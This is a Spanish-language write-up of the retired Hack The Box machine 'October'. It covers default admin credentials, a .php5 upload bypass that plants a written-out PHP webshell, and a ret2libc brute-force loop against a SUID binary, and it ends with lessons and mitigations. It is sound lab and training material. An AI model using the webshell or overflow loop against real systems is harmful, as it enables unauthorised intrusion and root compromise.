---
machine: October
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, octobercms, upload-bypass, buffer-overflow, aslr, ret2libc]
---

# October — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

October CMS Build 412 conserva las credenciales por defecto `admin:admin`. El gestor de medios bloquea extensiones PHP habituales pero no `.php5`, lo que permite subir una webshell. La escalada es un desbordamiento de pila en el SUID `ovrflw` de 32 bits: offset 112, NX, sin PIE y ASLR de nueve bits, vencido con un bucle de ret2libc.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,80 <IP>
```

- OpenSSH y Apache 2.4.7 sobre Ubuntu 14.04.
- `http-title: October CMS - Vanilla`.

## Enumeración

```bash
curl -s http://<IP>/backend
```

El panel `/backend` acepta `admin:admin`. En Media se comprueba que `.php` está bloqueado, pero `.php5` no.

## Foothold

```bash
printf '<?php system($_REQUEST["cmd"]); ?>' > cmd.php5
curl -s -F "file=@cmd.php5" http://<IP>/backend/cms/media
curl -s "http://<IP>/storage/app/media/cmd.php5?cmd=id"
```

La webshell se ejecuta como `www-data`. Se lanza una reverse shell y se estabiliza.

## Movimiento lateral

No hay pivote necesario. Se enumera el sistema y se localiza el binario SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/local/bin/ovrflw
```

## Escalada de privilegios

`ovrflw` es i386, sin canario, NX y sin PIE. Con `pattern_create` se obtiene un offset de 112. La base de libc cambia solo en nueve bits, así que se prueba ret2libc en bucle:

```bash
while true; do
  /usr/local/bin/ovrflw "$(python -c 'print "A"*112 + "<system>" + "<exit>" + "<binsh>"')"
done
```

Cuando coincide la base, se obtiene una shell con `euid=0`.

## Evidencia

- Panel con credenciales por defecto.
- Respuesta de la webshell y `id`.
- `checksec` del SUID: NX, no PIE.
- Bucle y `id` con `euid=0`.

## Lecciones aprendidas

- Las listas negras de extensiones fallan si el servidor interpreta otras.
- Un ASLR con poca entropía se puede vencer por fuerza bruta.
- Los binarios SUID personalizados merecen una revisión completa.

## Mitigaciones y detección

- Cambiar credenciales por defecto y aplicar listas blancas de extensiones.
- Deshabilitar la ejecución PHP en directorios de subida.
- Retirar SUID innecesarios y compilar con canario y PIE.
- Alertar de subidas `.php5` y de ejecuciones repetidas de un SUID.

## Referencias

- <https://www.hackthebox.com/machines/October>
- <https://0xdf.gitlab.io/2019/03/26/htb-october.html>
- <https://www.exploit-db.com/exploits/41936>
- <https://attack.mitre.org/techniques/T1190/>
